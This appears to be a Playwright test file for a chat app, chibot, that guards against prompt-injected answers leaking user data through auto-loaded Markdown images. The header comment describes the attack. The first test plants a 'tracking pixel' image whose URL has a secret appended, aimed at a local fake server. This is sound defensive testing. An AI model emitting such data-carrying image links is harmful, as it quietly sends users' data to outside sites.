import { expect, test } from '@playwright/test'
import {
  answer,
  answered,
  appReady,
  FAKE_OPENAI,
  savedChat,
  send,
} from './helpers.ts'

// An answer written under the influence of a planted page can contain a
// Markdown image whose address carries the user's data: a browser that loads
// it has sent the data away without a click. So an image from another site
// loads by itself only if its address is exactly one the user wrote or a tool
// returned (nothing could have been added to it), and any other waits for a
// click. The fake model repeats the question, so a question with an image in
// it makes an answer with one (and `savedChat` puts in a chosen answer).

const pixelHits = async (page: import('@playwright/test').Page) =>
  (await (
    await page.request.get(`${FAKE_OPENAI}/debug/pixel-hits`)
  ).json()) as string[]

test('does not load an image the model added data to, until it is clicked', async ({
  page,
}) => {
  const secret = `secret-${Date.now()}`
  const known = `${FAKE_OPENAI}/debug/pixel?d=mine`
  const planted = `${known}-and-${secret}`
  const id = await savedChat(page, {
    question: `My picture is ${known}`,
    answerText: `Here ![tracking pixel](${planted}) done`,
  })
  const requested: string[] = []
  page.on('request', (request) => requested.push(request.url()))
  await page.goto(`/c/${id}`)
  const message = page.locator('.message.assistant')

  // Nothing asked the other site for it, and the browser was not asked either…
  await expect(message.locator('.remote-media')).toBeVisible()
  await expect(message.locator('img')).toHaveCount(0)
  expect(requested.filter((url) => url.includes(secret))).toEqual([])
  expect((await pixelHits(page)).filter((url) => url.includes(secret))).toEqual(
    [],
  )
  // …and it says where it is from, with the choice of loading it or opening it.
  await expect(message.locator('.remote-media')).toContainText('127.0.0.1')
  await expect(message.getByRole('link', { name: 'Open' })).toHaveAttribute(
    'href',
    planted,
  )

  // A click is the user's decision: now the server fetches it, and it shows.
  await message.getByRole('button', { name: 'Load' }).click()
  const image = message.locator('img.remote-media-image')
  await expect(image).toHaveAttribute('src', /^\/api\/media\?/)
  await expect
    .poll(() => image.evaluate((img: HTMLImageElement) => img.naturalWidth))
    .toBe(1)
  expect(
    (await pixelHits(page)).filter((url) => url.includes(secret)),
  ).toHaveLength(1)
  // Never by the page itself: only chibot's own address was asked.
  expect(
    requested.filter(
      (url) => url.includes(secret) && !url.includes('/api/media'),
    ),
  ).toEqual([])
})

test('shows by itself an image the user wrote, through chibot', async ({
  page,
}) => {
  const pixel = `${FAKE_OPENAI}/debug/pixel?d=${Date.now()}`
  const requested: string[] = []
  page.on('request', (request) => requested.push(request.url()))
  await page.goto('/')
  await appReady(page)
  await send(page, `Here is the image ![my pixel](${pixel}) done`)
  await answered(page)

  const image = answer(page, 0).locator('img.remote-media-image')
  await expect
    .poll(() => image.evaluate((img: HTMLImageElement) => img.naturalWidth))
    .toBe(1)
  await expect(image).toHaveAttribute('src', /^\/api\/media\?/)
  // The page only ever talked to chibot.
  expect(
    requested.filter(
      (url) => url.startsWith(FAKE_OPENAI) && url.includes('pixel'),
    ),
  ).toEqual([])
  expect(await pixelHits(page)).toContain(pixel)
})

test('plays a sound the user linked, and seeks in it', async ({ page }) => {
  const beep = `${FAKE_OPENAI}/media/beep.wav`
  await page.goto('/')
  await appReady(page)
  await send(page, `Play ${beep} please`)
  await answered(page)

  const player = answer(page, 0).locator('audio.remote-media-player')
  await expect(player).toHaveAttribute('src', /^\/api\/media\?/)
  await expect(player).toHaveJSProperty('controls', true)
  await expect
    .poll(() => player.evaluate((audio: HTMLAudioElement) => audio.readyState))
    .toBeGreaterThan(0)
  // Seeking asks for a range, which chibot passes on.
  const range = await page.request.get(
    (await player.getAttribute('src')) as string,
    {
      headers: { Range: 'bytes=0-9' },
    },
  )
  expect(range.status()).toBe(206)
  expect(range.headers()['content-range']).toMatch(/^bytes 0-9\//)
})

test('a sound the model linked itself stays a link', async ({ page }) => {
  const id = await savedChat(page, {
    question: 'Show me something',
    answerText: `Listen: [a sound](${FAKE_OPENAI}/media/beep.wav?made-up)`,
  })
  await page.goto(`/c/${id}`)
  const message = page.locator('.message.assistant')
  await expect(message.getByRole('link', { name: 'a sound' })).toBeVisible()
  await expect(message.locator('audio')).toHaveCount(0)
})

test('only chibot’s own pages may ask it to fetch', async ({ page }) => {
  const id = await savedChat(page, {
    question: `${FAKE_OPENAI}/debug/pixel?d=x`,
    answerText: 'ok',
  })
  const url = `/api/media?c=${id}&u=${encodeURIComponent(`${FAKE_OPENAI}/debug/pixel?d=x`)}&confirm=1`
  const other = await page.request.get(url, {
    headers: { 'Sec-Fetch-Site': 'cross-site' },
  })
  expect(other.status()).toBe(403)
  expect((await page.request.get(url)).status()).toBe(200)
})

test('the browser itself refuses an image from another site, if one slips through', async ({
  page,
}) => {
  const secret = `slipped-${Date.now()}`
  await page.goto('/')
  await appReady(page)
  // As if the renderer had let one through: the page's own policy decides.
  const outcome = await page.evaluate(
    (src) =>
      new Promise<string>((resolve) => {
        const img = new Image()
        img.onload = () => resolve('loaded')
        img.onerror = () => resolve('refused')
        img.src = src
        document.body.append(img)
      }),
    `${FAKE_OPENAI}/debug/pixel?d=${secret}`,
  )
  expect(outcome).toBe('refused')
  expect((await pixelHits(page)).filter((url) => url.includes(secret))).toEqual(
    [],
  )
  // Nor may the page play sound from another site.
  const sound = await page.evaluate(
    (src) =>
      new Promise<string>((resolve) => {
        const audio = new Audio()
        audio.onloadeddata = () => resolve('loaded')
        audio.onerror = () => resolve('refused')
        audio.src = src
      }),
    `${FAKE_OPENAI}/media/beep.wav`,
  )
  expect(sound).toBe('refused')
})

test('still shows the images chibot itself serves', async ({ page }) => {
  await page.goto('/')
  await appReady(page)
  await send(page, 'draw a robot')
  await answered(page)
  const image = page.locator('.turn .image img').first()
  await expect(image).toHaveAttribute('src', /^\/api\/files\/[\w-]+$/)
})
